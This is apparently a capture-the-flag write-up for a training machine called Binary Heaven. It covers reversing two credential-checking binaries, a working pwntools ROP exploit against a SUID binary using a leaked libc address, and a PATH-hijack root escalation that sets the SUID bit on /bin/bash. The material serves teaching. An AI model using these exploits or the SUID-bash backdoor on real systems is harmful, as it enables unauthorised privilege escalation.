### 🏆 Binary Heaven Writeup

Overall Difficulty: Hard (as rated by the user) Target IP: 10.10.124.63

Background

The challenge involves reverse engineering Linux LSE executables, exploiting a stack buffer overflow with ROP chaining, and a final path-based exploit for root. Two "angels" guard the entry to binary heaven: angel_A and angel_B.

### 1. Service Enumeration

      The initial scan revealed a single open port:
      Port	Service	Version
      22/tcp	ssh	OpenSSH 7.2p2 Ubuntu

      export RHOSTS=10.10.124.63 

      └─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
      [...]
      PORT   STATE SERVICE REASON         VERSION
      22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 1cf70a100e561f69e1d4a6841993ec22 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvEnzqGnoqGQwHNI4eYUTXonK3vlcjLkKZi2cTwglrxBRuwCvmXO56RCjBtlVLbAXhPsZgUy9QYxE68P3FN9T69BELLGd1ZovRv5nX60/Cz/gc0NS/YLNbwWjGBMuqfIY2+nTTMGZ/EYUv343j3LA0RCy/BTLdnjomJbkMBvFZzmRxZzNFG4LqnOLk9eN+VjsadKqXLoxqoI+Owtj9nKMwaSkw3jpsA+QbtonvRCUjiEOiO26T8Q2tXvBM65Pp89FWL/HZvUXn81ycvMPsfujspGTvgfrF/zyqCfRLczOWLEDYuaw91f7P/abZ/02B6FolpDMuvNtEFofiK1pc6u6J
      |   256 400a887b7dc719d774422041c8cf3437 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEg/tfLCU4Z4quadJCk9sHS3GJYntlvlxlaazbeFULXRb18S0o84xSqAlr2D8Kbg1JlxI/lqa5uxd/hZTQr6Jac=
      |   256 af027950541e0beeb3d9c45c37cd28de (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA5B5aE2Zl6O8VdBvkAqUZoc15fnCEpIc941H1OwXVzC
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

The machine provided a credentials.zip file containing two executables: angel_A and angel_B.

    angel_A: ELF 64-bit LSB pie executable (PIE enabled)

    angel_B: ELF 64-bit LSB executable, statically linked, Go

### 2. Initial Foothold: User guardian

2.1. Angel_A: Username Discovery (Reverse Engineering)

### Listing all functions

      [0x7fe29a8c9950]> afl
      0x562ec5ca8090    1 43           entry0
      0x562ec5caafe0    5 4124 -> 4126 reloc.__libc_start_main
      0x562ec5ca80c0    4 41   -> 34   sym.deregister_tm_clones
      0x562ec5ca80f0    4 57   -> 51   sym.register_tm_clones
      0x562ec5ca8130    5 57   -> 50   sym.__do_global_dtors_aux
      0x562ec5ca8080    1 6            sym.imp.__cxa_finalize
      0x562ec5ca8170    1 5            entry.init0
      0x562ec5ca8000    3 23           sym._init
      0x562ec5ca82c0    1 1            sym.__libc_csu_fini
      0x562ec5ca82c4    1 9            sym._fini
      0x562ec5ca8260    4 93           sym.__libc_csu_init
      0x562ec5ca8175    8 225          main
      0x562ec5ca8030    1 6            sym.imp.puts
      0x562ec5ca8040    1 6            sym.imp.printf
      0x562ec5ca7000    3 348  -> 337  loc.imp._ITM_deregisterTMCloneTable
      0x562ec5ca8050    1 6            sym.imp.fgets
      0x562ec5ca8060    1 6            sym.imp.ptrace
      0x562ec5ca8070    1 6            sym.imp.exit

### Main() function
      
      [0x7fe29a8c9950]> pdf @main
                  ; DATA XREF from entry0 @ 0x562ec5ca80ad
      ┌ 225: int main (int argc, char **argv);
      │           ; var int64_t var_20h @ rbp-0x20
      │           ; var int64_t var_14h @ rbp-0x14
      │           ; var int64_t var_dh @ rbp-0xd
      │           ; var int64_t var_4h @ rbp-0x4
      │           ; arg int argc @ rdi
      │           ; arg char **argv @ rsi
      │           0x562ec5ca8175      55             push rbp
      │           0x562ec5ca8176      4889e5         mov rbp, rsp
      │           0x562ec5ca8179      4883ec20       sub rsp, 0x20
      │           0x562ec5ca817d      897dec         mov dword [var_14h], edi ; argc
      │           0x562ec5ca8180      488975e0       mov qword [var_20h], rsi ; argv
      │           0x562ec5ca8184      b900000000     mov ecx, 0
      │           0x562ec5ca8189      ba01000000     mov edx, 1
      │           0x562ec5ca818e      be00000000     mov esi, 0
      │           0x562ec5ca8193      bf00000000     mov edi, 0
      │           0x562ec5ca8198      b800000000     mov eax, 0
      │           0x562ec5ca819d      e8befeffff     call sym.imp.ptrace     ; long ptrace(__ptrace_request request, pid_t pid, void*addr, void*data)
      │           0x562ec5ca81a2      4883f8ff       cmp rax, 0xffffffffffffffff
      │       ┌─< 0x562ec5ca81a6      751b           jne 0x562ec5ca81c3
      │       │   0x562ec5ca81a8      488d3d590e00.  lea rdi, str.Using_debuggers__Here_is_tutorial_https:__www.youtube.com_watch_vdQw4w9WgXcQ_n_22 ; 0x562ec5ca9008 ; "Using debuggers? Here is tutorial https://www.youtube.com/watch?v=dQw4w9WgXcQ/n%22"
      │       │   0x562ec5ca81af      b800000000     mov eax, 0
      │       │   0x562ec5ca81b4      e887feffff     call sym.imp.printf     ; int printf(const char *format)
      │       │   0x562ec5ca81b9      bf01000000     mov edi, 1
      │       │   0x562ec5ca81be      e8adfeffff     call sym.imp.exit
      │       └─> 0x562ec5ca81c3      488d3d910e00.  lea rdi, str.e_36m_nSay_my_username____e_0m ; 0x562ec5ca905b
      │           0x562ec5ca81ca      b800000000     mov eax, 0
      │           0x562ec5ca81cf      e86cfeffff     call sym.imp.printf     ; int printf(const char *format)
      │           0x562ec5ca81d4      488b15a52e00.  mov rdx, qword [reloc.stdin] ; [0x562ec5cab080:8]=0
      │           0x562ec5ca81db      488d45f3       lea rax, [var_dh]
      │           0x562ec5ca81df      be09000000     mov esi, 9
      │           0x562ec5ca81e4      4889c7         mov rdi, rax
      │           0x562ec5ca81e7      e864feffff     call sym.imp.fgets      ; char *fgets(char *s, int size, FILE *stream)
      │           0x562ec5ca81ec      c745fc000000.  mov dword [var_4h], 0
      │       ┌─< 0x562ec5ca81f3      eb48           jmp 0x562ec5ca823d
      │      ┌──> 0x562ec5ca81f5      8b45fc         mov eax, dword [var_4h]
      │      ╎│   0x562ec5ca81f8      4898           cdqe
      │      ╎│   0x562ec5ca81fa      488d14850000.  lea rdx, [rax*4]
      │      ╎│   0x562ec5ca8202      488d05572e00.  lea rax, obj.username   ; 0x562ec5cab060 ; U"kym~humr"
      │      ╎│   0x562ec5ca8209      8b1402         mov edx, dword [rdx + rax]
      │      ╎│   0x562ec5ca820c      8b45fc         mov eax, dword [var_4h]
      │      ╎│   0x562ec5ca820f      4898           cdqe
      │      ╎│   0x562ec5ca8211      0fb64405f3     movzx eax, byte [rbp + rax - 0xd]
      │      ╎│   0x562ec5ca8216      83f004         xor eax, 4
      │      ╎│   0x562ec5ca8219      0fbec0         movsx eax, al
      │      ╎│   0x562ec5ca821c      83c008         add eax, 8
      │      ╎│   0x562ec5ca821f      39c2           cmp edx, eax
      │     ┌───< 0x562ec5ca8221      7416           je 0x562ec5ca8239
      │     │╎│   0x562ec5ca8223      488d3d560e00.  lea rdi, str.e_31m_nThat_is_not_my_username_e_0m ; 0x562ec5ca9080
      │     │╎│   0x562ec5ca822a      e801feffff     call sym.imp.puts       ; int puts(const char *s)
      │     │╎│   0x562ec5ca822f      bf00000000     mov edi, 0
      │     │╎│   0x562ec5ca8234      e837feffff     call sym.imp.exit
      │     └───> 0x562ec5ca8239      8345fc01       add dword [var_4h], 1
      │      ╎│   ; CODE XREF from main @ 0x562ec5ca81f3
      │      ╎└─> 0x562ec5ca823d      837dfc07       cmp dword [var_4h], 7
      │      └──< 0x562ec5ca8241      7eb2           jle 0x562ec5ca81f5
      │           0x562ec5ca8243      488d3d5e0e00.  lea rdi, str.e_32m_nCorrect__That_is_my_name_e_0m ; 0x562ec5ca90a8
      │           0x562ec5ca824a      e8e1fdffff     call sym.imp.puts       ; int puts(const char *s)
      │           0x562ec5ca824f      b800000000     mov eax, 0
      │           0x562ec5ca8254      c9             leave
      └           0x562ec5ca8255      c3             ret


The angel_A binary prompted for a username and included an anti-debugging check using ptrace.

Vulnerability: A simple username check with a mathematical obfuscation in the main function:

    Ripped String (from disassembly): kym~humr

    Obfuscation Logic: ((input_char XOR 4) + 8) == stored_char

The reverse engineering script was created to find the correct input character:
         
         Input Char=(Stored Value−8)⊕4

### The script for Angel_A
      
      #!/usr/env/bin python3
      def main():
      	XORed_value = 'kym~humr'
      	username = ''
      
      	for each_character in XORed_value:
      		unicode_value = ord(each_character)
      		username += chr((unicode_value - 8) ^ 4)
      	
      	return username
      
      if __name__ == '__main__':
      	print(main())

### Result: The correct username is guardian.

### 2.2. Angel_B: Password Discovery (Runtime Analysis)

### All function names

      gef➤  info functions
      All defined functions:
      
      File /mnt/c/Users/User/Downloads/binary_heaven/password.go:
      	void main.main(void);
      [...]

### main.main and setting a breakpoint

      gef➤  break main.main
      Breakpoint 1 at 0x4a52c0: file /mnt/c/Users/User/Downloads/binary_heaven/password.go, line 3.
      gef➤  run
      [...]

### disas to dump all assemble codes in the function

      gef➤  disass main.main
      Dump of assembler code for function main.main:
      => 0x00000000004a52c0 <+0>:	mov    rcx,QWORD PTR fs:0xfffffffffffffff8
         0x00000000004a52c9 <+9>:	lea    rax,[rsp-0x40]
         0x00000000004a52ce <+14>:	cmp    rax,QWORD PTR [rcx+0x10]
         0x00000000004a52d2 <+18>:	jbe    0x4a5560 <main.main+672>
         0x00000000004a52d8 <+24>:	sub    rsp,0xc0
         0x00000000004a52df <+31>:	mov    QWORD PTR [rsp+0xb8],rbp
         0x00000000004a52e7 <+39>:	lea    rbp,[rsp+0xb8]
         0x00000000004a52ef <+47>:	lea    rax,[rip+0x24cce]        # 0x4c9fc4
         0x00000000004a52f6 <+54>:	mov    QWORD PTR [rsp],rax
         0x00000000004a52fa <+58>:	mov    QWORD PTR [rsp+0x8],0x5
         0x00000000004a5303 <+67>:	call   0x40a120 <runtime.convTstring>
         0x00000000004a5308 <+72>:	mov    rax,QWORD PTR [rsp+0x10]
         0x00000000004a530d <+77>:	xorps  xmm0,xmm0
         0x00000000004a5310 <+80>:	movups XMMWORD PTR [rsp+0x98],xmm0
         0x00000000004a5318 <+88>:	movups XMMWORD PTR [rsp+0xa8],xmm0
         0x00000000004a5320 <+96>:	lea    rcx,[rip+0xbb99]        # 0x4b0ec0
         0x00000000004a5327 <+103>:	mov    QWORD PTR [rsp+0x98],rcx
         0x00000000004a532f <+111>:	mov    QWORD PTR [rsp+0xa0],rax
         0x00000000004a5337 <+119>:	mov    QWORD PTR [rsp+0xa8],rcx
         0x00000000004a533f <+127>:	lea    rax,[rip+0x441ea]        # 0x4e9530
         0x00000000004a5346 <+134>:	mov    QWORD PTR [rsp+0xb0],rax
         0x00000000004a534e <+142>:	mov    rax,QWORD PTR [rip+0xc395b]        # 0x568cb0 <os.Stdout>
         0x00000000004a5355 <+149>:	lea    rdx,[rip+0x45a04]        # 0x4ead60 <go.itab.*os.File,io.Writer>
         0x00000000004a535c <+156>:	mov    QWORD PTR [rsp],rdx
         0x00000000004a5360 <+160>:	mov    QWORD PTR [rsp+0x8],rax
         0x00000000004a5365 <+165>:	lea    rax,[rsp+0x98]
         0x00000000004a536d <+173>:	mov    QWORD PTR [rsp+0x10],rax
         0x00000000004a5372 <+178>:	mov    QWORD PTR [rsp+0x18],0x2
         0x00000000004a537b <+187>:	mov    QWORD PTR [rsp+0x20],0x2
         0x00000000004a5384 <+196>:	call   0x499620 <fmt.Fprintln>
         0x00000000004a5389 <+201>:	lea    rax,[rip+0xbb30]        # 0x4b0ec0
         0x00000000004a5390 <+208>:	mov    QWORD PTR [rsp],rax
         0x00000000004a5394 <+212>:	call   0x40cde0 <runtime.newobject>
         0x00000000004a5399 <+217>:	mov    rax,QWORD PTR [rsp+0x8]
         0x00000000004a539e <+222>:	mov    QWORD PTR [rsp+0x40],rax
         0x00000000004a53a3 <+227>:	xorps  xmm0,xmm0
         0x00000000004a53a6 <+230>:	movups XMMWORD PTR [rsp+0x48],xmm0
         0x00000000004a53ab <+235>:	lea    rcx,[rip+0x95ee]        # 0x4ae9a0
         0x00000000004a53b2 <+242>:	mov    QWORD PTR [rsp+0x48],rcx
         0x00000000004a53b7 <+247>:	mov    QWORD PTR [rsp+0x50],rax
         0x00000000004a53bc <+252>:	mov    rcx,QWORD PTR [rip+0xc38e5]        # 0x568ca8 <os.Stdin>
         0x00000000004a53c3 <+259>:	lea    rdx,[rip+0x45976]        # 0x4ead40 <go.itab.*os.File,io.Reader>
         0x00000000004a53ca <+266>:	mov    QWORD PTR [rsp],rdx
         0x00000000004a53ce <+270>:	mov    QWORD PTR [rsp+0x8],rcx
         0x00000000004a53d3 <+275>:	lea    rcx,[rsp+0x48]
         0x00000000004a53d8 <+280>:	mov    QWORD PTR [rsp+0x10],rcx
         0x00000000004a53dd <+285>:	mov    QWORD PTR [rsp+0x18],0x1
         0x00000000004a53e6 <+294>:	mov    QWORD PTR [rsp+0x20],0x1
         0x00000000004a53ef <+303>:	call   0x49f8c0 <fmt.Fscanln>
         0x00000000004a53f4 <+308>:	mov    rax,QWORD PTR [rsp+0x40]
         0x00000000004a53f9 <+313>:	mov    rcx,QWORD PTR [rax+0x8]
         0x00000000004a53fd <+317>:	mov    rax,QWORD PTR [rax]
         0x00000000004a5400 <+320>:	cmp    rcx,0xb
         0x00000000004a5404 <+324>:	je     0x4a54a1 <main.main+481>
         0x00000000004a540a <+330>:	lea    rax,[rip+0x24ba9]        # 0x4c9fba
         0x00000000004a5411 <+337>:	mov    QWORD PTR [rsp],rax
         0x00000000004a5415 <+341>:	mov    QWORD PTR [rsp+0x8],0x5
         0x00000000004a541e <+350>:	xchg   ax,ax
         0x00000000004a5420 <+352>:	call   0x40a120 <runtime.convTstring>
         0x00000000004a5425 <+357>:	mov    rax,QWORD PTR [rsp+0x10]
         0x00000000004a542a <+362>:	xorps  xmm0,xmm0
         0x00000000004a542d <+365>:	movups XMMWORD PTR [rsp+0x58],xmm0
         0x00000000004a5432 <+370>:	movups XMMWORD PTR [rsp+0x68],xmm0
         0x00000000004a5437 <+375>:	lea    rcx,[rip+0xba82]        # 0x4b0ec0
         0x00000000004a543e <+382>:	mov    QWORD PTR [rsp+0x58],rcx
         0x00000000004a5443 <+387>:	mov    QWORD PTR [rsp+0x60],rax
         0x00000000004a5448 <+392>:	mov    QWORD PTR [rsp+0x68],rcx
         0x00000000004a544d <+397>:	lea    rax,[rip+0x440fc]        # 0x4e9550
         0x00000000004a5454 <+404>:	mov    QWORD PTR [rsp+0x70],rax
         0x00000000004a5459 <+409>:	mov    rax,QWORD PTR [rip+0xc3850]        # 0x568cb0 <os.Stdout>
         0x00000000004a5460 <+416>:	lea    rcx,[rip+0x458f9]        # 0x4ead60 <go.itab.*os.File,io.Writer>
         0x00000000004a5467 <+423>:	mov    QWORD PTR [rsp],rcx
         0x00000000004a546b <+427>:	mov    QWORD PTR [rsp+0x8],rax
         0x00000000004a5470 <+432>:	lea    rax,[rsp+0x58]
         0x00000000004a5475 <+437>:	mov    QWORD PTR [rsp+0x10],rax
         0x00000000004a547a <+442>:	mov    QWORD PTR [rsp+0x18],0x2
         0x00000000004a5483 <+451>:	mov    QWORD PTR [rsp+0x20],0x2
         0x00000000004a548c <+460>:	call   0x499620 <fmt.Fprintln>
         0x00000000004a5491 <+465>:	mov    rbp,QWORD PTR [rsp+0xb8]
         0x00000000004a5499 <+473>:	add    rsp,0xc0
         0x00000000004a54a0 <+480>:	ret    
         0x00000000004a54a1 <+481>:	mov    QWORD PTR [rsp],rax
         0x00000000004a54a5 <+485>:	lea    rax,[rip+0x2585f]        # 0x4cad0b
         0x00000000004a54ac <+492>:	mov    QWORD PTR [rsp+0x8],rax
         0x00000000004a54b1 <+497>:	mov    QWORD PTR [rsp+0x10],rcx
         0x00000000004a54b6 <+502>:	call   0x4022e0 <runtime.memequal>
         0x00000000004a54bb <+507>:	cmp    BYTE PTR [rsp+0x18],0x0
         0x00000000004a54c0 <+512>:	je     0x4a540a <main.main+330>
         0x00000000004a54c6 <+518>:	lea    rax,[rip+0x24af2]        # 0x4c9fbf
         0x00000000004a54cd <+525>:	mov    QWORD PTR [rsp],rax
         0x00000000004a54d1 <+529>:	mov    QWORD PTR [rsp+0x8],0x5
         0x00000000004a54da <+538>:	call   0x40a120 <runtime.convTstring>
         0x00000000004a54df <+543>:	mov    rax,QWORD PTR [rsp+0x10]
         0x00000000004a54e4 <+548>:	xorps  xmm0,xmm0
         0x00000000004a54e7 <+551>:	movups XMMWORD PTR [rsp+0x78],xmm0
         0x00000000004a54ec <+556>:	movups XMMWORD PTR [rsp+0x88],xmm0
         0x00000000004a54f4 <+564>:	lea    rcx,[rip+0xb9c5]        # 0x4b0ec0
         0x00000000004a54fb <+571>:	mov    QWORD PTR [rsp+0x78],rcx
         0x00000000004a5500 <+576>:	mov    QWORD PTR [rsp+0x80],rax
         0x00000000004a5508 <+584>:	mov    QWORD PTR [rsp+0x88],rcx
         0x00000000004a5510 <+592>:	lea    rax,[rip+0x44029]        # 0x4e9540
         0x00000000004a5517 <+599>:	mov    QWORD PTR [rsp+0x90],rax
         0x00000000004a551f <+607>:	mov    rax,QWORD PTR [rip+0xc378a]        # 0x568cb0 <os.Stdout>
         0x00000000004a5526 <+614>:	lea    rcx,[rip+0x45833]        # 0x4ead60 <go.itab.*os.File,io.Writer>
         0x00000000004a552d <+621>:	mov    QWORD PTR [rsp],rcx
         0x00000000004a5531 <+625>:	mov    QWORD PTR [rsp+0x8],rax
         0x00000000004a5536 <+630>:	lea    rax,[rsp+0x78]
         0x00000000004a553b <+635>:	mov    QWORD PTR [rsp+0x10],rax
         0x00000000004a5540 <+640>:	mov    QWORD PTR [rsp+0x18],0x2
         0x00000000004a5549 <+649>:	mov    QWORD PTR [rsp+0x20],0x2
         0x00000000004a5552 <+658>:	call   0x499620 <fmt.Fprintln>
         0x00000000004a5557 <+663>:	jmp    0x4a5491 <main.main+465>
         0x00000000004a555c <+668>:	nop    DWORD PTR [rax+0x0]
         0x00000000004a5560 <+672>:	call   0x461620 <runtime.morestack_noctxt>
         0x00000000004a5565 <+677>:	jmp    0x4a52c0 <main.main>
      End of assembler dump.

### Interesting instructions

      0x00000000004a53ef <+303>:	call   0x49f8c0 <fmt.Fscanln>
      [...]
      0x00000000004a5400 <+320>:	cmp    rcx,0xb
      [...]
      0x00000000004a54b6 <+502>:	call   0x4022e0 <runtime.memequal>

### What this does is:

    Call function fmt.Fscanln, which reads the user's input.
    Compare RCX register with 11 length (B in hex means 11)
    Call function runtime.memequal, which compares some registers

### Setting a breakpoint at 0x00000000004a54b6

      gef➤  break *0x00000000004a54b6
      Breakpoint 2 at 0x4a54b6: file /mnt/c/Users/User/Downloads/binary_heaven/password.go, line 14.
      gef➤  run
      [...]
      gef➤  c
      Continuing.
       
      Say the magic word >> 

### We type 11 length of charchters 12345678901

      Say the magic word >>
      12345678901
      
      Thread 1 "angel_B" hit Breakpoint 2, 0x00000000004a54b6 in main.main () at /mnt/c/Users/User/Downloads/binary_heaven/password.go:14
      14	in /mnt/c/Users/User/Downloads/binary_heaven/password.go
      [...]
      $rax   : 0x000000004cad0b  →  "{Redacted}IdeographicMedefaidrinNandinagariNew_Ta[...]"

The angel_B Go binary prompted for a "magic word." Runtime analysis with gdb and gef showed a check for a password string:

    The binary compared the user input length to 0xb (11 in decimal).

    It then called runtime.memequal to compare the input against a hardcoded value.

Exploitation: By setting a breakpoint at the comparison function and examining registers, the hardcoded string was revealed:

    Password: {Redacted}

Final Credentials:

    Username: guardian

    Password: {Redacted}

### Initial Flag: THM{Redacted}

      guardian@heaven:~$ cat guardian_flag.txt 
      THM{Redacted}

### 3. Privilege Escalation: guardian to binexgod (Buffer Overflow + ROP)

### binary with SUID sticky bit owned by binexgod

      guardian@heaven:~$ ls -lah
      [...]
      -rwsr-sr-x 1 binexgod binexgod  16K May  8  2021 pwn_me
      [...]
      
      guardian@heaven:~$ file pwn_me 
      pwn_me: setuid, setgid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=09a0fc14e276c9e16015cc8efff3389f3e576ba6, for GNU/Linux 3.2.0, not stripped


The next step involved exploiting the SUID binary /home/guardian/pwn_me, which was owned by user binexgod.

    File Type: ELF 32-bit LSB shared object (i386) with SUID/SGID bits set.

    Prompt: Binexgod said he want to make this easy. System is at: 0xf7c47040 (Note the leaked address!)

### 3.1. Binary Protections and Offset

The binary had the following mitigations:

    No Canary

    Full RELRO (GOT read-only)

    NX enabled (No shellcode execution on the stack)

    PIE enabled (Address randomization)

### The initial ROP setup involved finding the EIP offset:

    Pattern Create/Offset: Found the value 0x61616169 (iaaa) at the Instruction Pointer ($eip).

    EIP Offset: 32 bytes.

### 3.2. ROP Chain Exploit (32-bit ASLR Bypass)
      
      Since NX was enabled, a Return-Oriented Programming (ROP) chain was used to call the system() function from the leaked libc address. The leak provides a base address for the active libc library, bypassing PIE/ASLR for the library.

Exploit Logic:

    Leak: Capture the leaked system() address: 0xf7c47040.

    Libc Base: Calculate the libc base address by subtracting the offset of system() in the local copy of the target's libc:
    Libc Base=Leaked System Address−Local libc.sym[’system’]

    Target: Find the address of the string "/bin/sh" within the calculated libc base.


### The final script

      #!/usr/bin/env python3
      
      from pwn import *
      
      offset = 32
      padding = b'A' * offset
      
      elf = context.binary = ELF('./pwn_me')
      libc = elf.libc
      
      def main():
      	with process() as p:
      		# Get system address in hex
      		p.recvuntil(b'System is at: ')
      		system_address = int(p.recv(), 16)
      		log.success('System address: {}'.format(system_address))
      
      		# Set our libc address to the system address
      		libc.address = system_address - libc.sym['system']
      		log.success('libc address: {}'.format(libc.address))
      
      		# Get the address of /bin/sh from libc
      		shell = next(libc.search(b'/bin/sh'))
      		log.success('/bin/sh address: {}'.format(shell))
      
      		# ROP chain
      		rop = ROP(libc)
      		rop.raw(padding)
      		rop.system(shell)
      
      		# Send the ROP chain
      		p.sendline(rop.chain())
      		log.success('Sending payload: {}'.format(rop.chain()))
      
      		# Change to interactive shell
      		try:
      			p.interactive()
      		except:
      			log.failure('Failed to spawn an interactive shell')
      
      if __name__ == '__main__':
      	main()

### Result: Execution of this exploit on the target machine provided a shell as user binexgod   

      $ whoami;id
      binexgod
      uid=1002(binexgod) gid=1001(guardian) groups=1001(guardian)

### Binexgod Flag: THM{Redacted}

      $ cat /home/binexgod/binexgod_flag.txt
      THM{Redacted}

### 4. Privilege Escalation: binexgod to root

### in the home direcotory of binexgod, there is a binaray with SUID sticky bit called vuln

      $ ls -lah /home/binexgod
      [...]
      -rwsr-xr-x  1 root     binexgod 8.7K Mar 15  2021 vuln
      -rwxr-xr--  1 root     binexgod  327 Mar  8  2021 vuln.c
      
      $ file /home/binexgod/vuln
      /home/binexgod/vuln: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,        BuildID[sha1]=5a6f0108a2b7324107c80bd42e5789a8478470ec, not stripped

### /home/binexgod/vuln.c:

      #include <stdlib.h>
      #include <unistd.h>
      #include <string.h>
      #include <sys/types.h>
      #include <stdio.h>
      
      int main(int argc, char **argv, char **envp)
      {
        gid_t gid;
        uid_t uid;
        gid = getegid();
        uid = geteuid();
      
        setresgid(gid, gid, gid);
        setresuid(uid, uid, uid);
      
        system("/usr/bin/env echo Get out of heaven lol");
      }
### Explenation 
      If you look at the echo command it does not use the absolute path. Meaning this can be abused to get root access.

The final stage involves exploiting the last SUID binary /home/binexgod/vuln, which is owned by root. The source code, /home/binexgod/vuln.c, is also provided.

The most likely exploit here is a PATH environment variable hijack.

The Plan: PATH Hijack

    Analyze vuln.c: Find an external command called without its absolute path (e.g., system("some_command");).

    Create Malicious Executable: Create a shell script named some_command that executes /bin/bash -p.

    Hijack PATH: Set the $PATH to point to the malicious script's location first.

    Execute SUID Binary: Run /home/binexgod/vuln to gain a root shell.

### Create fake echo script

      $ cat << EOF > /tmp/echo
      $ chmod +s /bin/bash
      $ EOF

### This script will add a SUID sticky bit to /bin/bash / mark it executable
      
      $ chmod +x /tmp/echo
      
      $ ls -lah /tmp/echo
      -rwxrwxr-x 1 binexgod guardian 19 Oct 20 07:27 /tmp/echo

### Export new path environment variable

      $ export PATH=/tmp:$PATH

### Run the vuln binary in /tmp:
      
       cd /tmp;/home/binexgod/vuln
      
      $ ls -lah /bin/bash
      -rwsr-sr-x 1 root root 1014K Jul 12  2019 /bin/bash

### We successfully added SUID sticky bit to /bin/bash! / lets spawn the shell with SUID privs

      $ /bin/bash -p
      $ whoami;hostname;id;ip a
      root
      heaven
      uid=1002(binexgod) gid=1001(guardian) euid=0(root) egid=0(root) groups=0(root),1001(guardian)
      [...]
      2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
          link/ether 02:7a:bb:2e:ce:71 brd ff:ff:ff:ff:ff:ff
          inet 10.10.124.63/16 brd 10.10.255.255 scope global eth0
             valid_lft forever preferred_lft forever
          inet6 fe80::7a:bbff:fe2e:ce71/64 scope link 
             valid_lft forever preferred_lft forever

### The root flag
      $ cat /root/root.txt
      THM{Redacted}

         
